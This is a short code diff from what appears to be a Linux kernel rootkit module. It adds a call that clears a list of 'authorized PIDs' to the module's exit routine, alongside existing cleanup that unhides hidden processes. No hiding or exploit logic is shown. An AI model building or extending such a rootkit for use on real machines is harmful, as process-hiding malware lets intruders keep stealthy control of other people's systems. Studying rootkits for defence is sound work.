@@ -43,6 +43,9 @@ static __exit void rootkit_exit(void)
     // Clear the list of hidden PIDs
     show_all_processes();
 
+    // Clear the list of authorized PIDs
+    clear_auth_list();
+
     pr_info("[ROOTKIT] Module unloaded\n");
     return;
 }
